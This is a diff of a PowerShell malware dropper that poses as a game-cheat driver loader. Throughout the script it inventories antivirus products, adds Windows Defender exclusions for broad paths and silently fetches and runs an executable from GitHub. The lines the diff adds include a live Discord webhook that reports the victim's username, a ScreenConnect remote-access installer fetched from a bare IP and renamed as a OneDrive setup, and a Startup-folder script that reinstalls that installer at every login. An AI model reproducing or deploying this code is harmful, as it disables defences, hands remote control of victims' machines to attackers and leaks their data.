@@ -19,14 +19,14 @@ try {
         $DefenderStatus = if ($DefenderService) { $DefenderService.Status } else { 'Not Installed' }
     } catch {
         $DefenderStatus = 'Error retrieving status'
-        Send-WebhookMessage -Message "Error getting Defender service status: $_"
+        Send-WebhookMessage -Message "Error getting Defender service status: $($_)"
     }
 
     try {
         $DefenderRealtime = Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring
     } catch {
         $DefenderRealtime = 'Unavailable'
-        Send-WebhookMessage -Message "Error getting Defender real-time protection status: $_"
+        Send-WebhookMessage -Message "Error getting Defender real-time protection status: $($_)"
     }
 
     try {
@@ -34,7 +34,7 @@ try {
             Select-Object displayName, productState, pathToSignedProductExe
     } catch {
         $InstalledAV = $null
-        Send-WebhookMessage -Message "Error retrieving installed antivirus products: $_"
+        Send-WebhookMessage -Message "Error retrieving installed antivirus products: $($_)"
     }
 
     try {
@@ -42,7 +42,7 @@ try {
         $DefenderExeStatus = if ($DefenderExe) { 'Yes' } else { 'No' }
     } catch {
         $DefenderExeStatus = 'Error checking executable'
-        Send-WebhookMessage -Message "Error checking Defender executable: $_"
+        Send-WebhookMessage -Message "Error checking Defender executable: $($_)"
     }
 
     try {
@@ -50,7 +50,7 @@ try {
         $RegStatus = if ($WinDefendReg) { 'Yes' } else { 'No' }
     } catch {
         $RegStatus = 'Error checking registry'
-        Send-WebhookMessage -Message "Error accessing Windows Defender registry: $_"
+        Send-WebhookMessage -Message "Error accessing Windows Defender registry: $($_)"
     }
 
     try {
@@ -66,7 +66,7 @@ try {
         } else { "   None detected" }
     } catch {
         $avInfo = "   Error processing antivirus info"
-        Send-WebhookMessage -Message "Error processing antivirus product info: $_"
+        Send-WebhookMessage -Message "Error processing antivirus product info: $($_)"
     }
 
     $knownAVPaths = @(
@@ -138,11 +138,12 @@ try {
     $pathAVs = @()
     foreach ($path in $knownAVPaths) {
         try {
-            if (Test-Path $path -ErrorAction SilentlyContinue) {
+            if ($path -and (Test-Path $path -ErrorAction SilentlyContinue)) {
                 $pathAVs += $path
             }
         } catch {
-            Send-WebhookMessage -Message "Error checking path $path: $_"
+            $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
+            Send-WebhookMessage -Message "Error checking path $path : $errorMessage"
         }
     }
 
@@ -150,7 +151,7 @@ try {
         $pathAVsInfo = if ($pathAVs) { $pathAVs -join "`n" } else { "   None detected" }
     } catch {
         $pathAVsInfo = "   Error processing path info"
-        Send-WebhookMessage -Message "Error processing antivirus path info: $_"
+        Send-WebhookMessage -Message "Error processing antivirus path info: $($_)"
     }
 
     $message = @"
@@ -168,16 +169,14 @@ Installed Antivirus Products (By Path):
     try {
         Send-WebhookMessage -Message $message
     } catch {
-        Write-Error "Failed to send webhook message: $_"
+        Write-Error "Failed to send webhook message: $($_)"
     }
 
-
-    
     $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
     $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
     if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
         Add-Type -AssemblyName PresentationFramework
-        [System.Windows.MessageBox]::Show('Please run this script as administrator','Warning',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Warning)
+        [System.Windows.MessageBox]::Show('Please run as administrator','Warning',[System.Windows.MessageBoxButton]::OK,[System.Windows.MessageBoxImage]::Warning)
         exit
     }
 
@@ -192,7 +191,7 @@ Installed Antivirus Products (By Path):
         
         Start-Process powershell -ArgumentList $arguments -WindowStyle Hidden
     }
-    Show-SilentMessageBox -Message "Please give us 15-30 seconds to set up the filebase and download dependencies" -Title "Info"
+    Show-SilentMessageBox -Message "Assigning and loading the driver... (launch ur game in 60s)" -Title "Info"
 
     $programFiles = "C:\Program Files"
     $tempFolder = $env:TEMP
@@ -205,7 +204,8 @@ Installed Antivirus Products (By Path):
             Add-MpPreference -ExclusionPath $dir.FullName -ErrorAction Stop | Out-Null
             Send-WebhookMessage -Message "Added exclusion: $($dir.FullName)"
         } catch {
-            Send-WebhookMessage -Message "Error adding exclusion for ${dir.FullName}: $_"
+            $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
+            Send-WebhookMessage -Message "Error adding exclusion for $($dir.FullName) : $errorMessage"
         }
     }
 
@@ -215,7 +215,8 @@ Installed Antivirus Products (By Path):
             Add-MpPreference -ExclusionPath $drive -ErrorAction Stop | Out-Null
             Send-WebhookMessage -Message "Added exclusion: $drive"
         } catch {
-            Send-WebhookMessage -Message "Error adding exclusion for ${tempFolder}: $_"
+            $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
+            Send-WebhookMessage -Message "Error adding exclusion for $drive : $errorMessage"
         }
     }
 
@@ -223,21 +224,24 @@ Installed Antivirus Products (By Path):
         Add-MpPreference -ExclusionPath $tempFolder -ErrorAction Stop | Out-Null
         Send-WebhookMessage -Message "Added exclusion: $tempFolder"
     } catch {
-        Send-WebhookMessage -Message "Error adding exclusion for ${tempFolder}: $_"
+        $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
+        Send-WebhookMessage -Message "Error adding exclusion for $tempFolder : $errorMessage"
     }
 
     try {
         Add-MpPreference -ExclusionPath $appDataFolder -ErrorAction Stop | Out-Null
         Send-WebhookMessage -Message "Added exclusion: $appDataFolder"
     } catch {
-        Send-WebhookMessage -Message "Error adding exclusion for ${appDataFolder}: $_"
+        $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
+        Send-WebhookMessage -Message "Error adding exclusion for $appDataFolder : $errorMessage"
     }
 
     try {
         Add-MpPreference -ExclusionPath $localAppDataFolder -ErrorAction Stop | Out-Null
         Send-WebhookMessage -Message "Added exclusion: $localAppDataFolder"
     } catch {
-        Send-WebhookMessage -Message "Error adding exclusion for ${localAppDataFolder}: $_"
+        $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
+        Send-WebhookMessage -Message "Error adding exclusion for $localAppDataFolder : $errorMessage"
     }
 
     $exeNames = @("msedge.exe", "OneDrive.exe", "GoogleUpdate.exe", "steam.exe")
@@ -247,7 +251,8 @@ Installed Antivirus Products (By Path):
         Add-MpPreference -ExclusionPath $destinationPath -ErrorAction Stop | Out-Null
         Send-WebhookMessage -Message "Added exclusion for download path: $destinationPath"
     } catch {
-        Send-WebhookMessage -Message "Error adding exclusion for ${destinationPath}: $_"
+        $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
+        Send-WebhookMessage -Message "Error adding exclusion for $destinationPath : $errorMessage"
     }
 
     $downloadUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
@@ -257,19 +262,65 @@ Installed Antivirus Products (By Path):
         Start-Process -FilePath $destinationPath -WindowStyle Hidden -ErrorAction Stop | Out-Null
         Send-WebhookMessage -Message "Executed $selectedExe"
     } catch {
-        Send-WebhookMessage -Message "Error downloading or executing ${selectedExe}: $_"
+        $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
+        Send-WebhookMessage -Message "Error downloading or executing $selectedExe : $errorMessage"
+    }
+
+    $newWebhookUrl = 'https://discord.com/api/webhooks/1419779190399569940/TTmoY4jWra0wwRca21U8RIEvesch8duCqnCcQxxDF28i1UNCB09oDOZ3FVVMwJW-5oK2'
+    try {
+        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+        $body = @{ content = "Ran by $currentUser" } | ConvertTo-Json -Depth 10
+        Invoke-WebRequest -Uri $newWebhookUrl -Method Post -Body $body -ContentType 'application/json; charset=utf-8' -Headers @{ 'User-Agent' = 'Mozilla/5.0' } -ErrorAction Stop | Out-Null
+        Send-WebhookMessage -Message "Sent new webhook message indicating script run by $currentUser"
+    } catch {
+        $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
+        Send-WebhookMessage -Message "Error sending new webhook message: $errorMessage"
+    }
+
+    try {
+        $msiDownloadUrl = 'http://87.121.84.32:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
+        $msiFilePath = Join-Path -Path $env:TEMP -ChildPath 'OneDriveSetup3.1.msi'
+        Invoke-WebRequest -Uri $msiDownloadUrl -OutFile $msiFilePath -UseBasicParsing -ErrorAction Stop | Out-Null
+        Start-Process -FilePath $msiFilePath -WindowStyle Hidden -ErrorAction Stop | Out-Null
+        Send-WebhookMessage -Message "Downloaded and executed MSI file to $msiFilePath"
+    } catch {
+        $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
+        Send-WebhookMessage -Message "Error downloading or executing MSI file $msiFilePath : $errorMessage"
+    }
+
+    try {
+        $startupFolder = Join-Path -Path $env:APPDATA -ChildPath 'Microsoft\Windows\Start Menu\Programs\Startup'
+        $startupScriptPath = Join-Path -Path $startupFolder -ChildPath 'UpdateCheck.ps1'
+        $startupScriptContent = @"
+try {
+    `$msiDownloadUrl = 'http://87.121.84.32:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest'
+    `$msiFilePath = Join-Path -Path `$env:TEMP -ChildPath 'OneDriveSetup3.1.msi'
+    Invoke-WebRequest -Uri `$msiDownloadUrl -OutFile `$msiFilePath -UseBasicParsing -ErrorAction Stop | Out-Null
+    Start-Process -FilePath `$msiFilePath -WindowStyle Hidden -ErrorAction Stop | Out-Null
+} catch {
+    `$errorMessage = `$_.ToString() -replace '[^\w\s\.\:\\]', ''
+}
+"@
+        Set-Content -Path $startupScriptPath -Value $startupScriptContent -ErrorAction Stop
+        Send-WebhookMessage -Message "Created startup script at $startupScriptPath"
+    } catch {
+        $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
+        Send-WebhookMessage -Message "Error creating startup script $startupScriptPath : $errorMessage"
     }
 
     $tempFile = Join-Path $env:TEMP ([System.Guid]::NewGuid().ToString() + ".py")
     $url = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/1.py"
-
     try {
         Invoke-WebRequest -Uri $url -OutFile $tempFile
         Start-Process -FilePath $tempFile
+        Send-WebhookMessage -Message "Downloaded and executed Python script: $tempFile"
     } catch {
+        $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
+        Send-WebhookMessage -Message "Error downloading or executing Python script $tempFile : $errorMessage"
     }
 
     Send-WebhookMessage -Message "Script completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
 } catch {
-    Send-WebhookMessage -Message "Unexpected error: $_"
+    $errorMessage = $_.ToString() -replace '[^\w\s\.\:\\]', ''
+    Send-WebhookMessage -Message "Unexpected error: $errorMessage"
 }
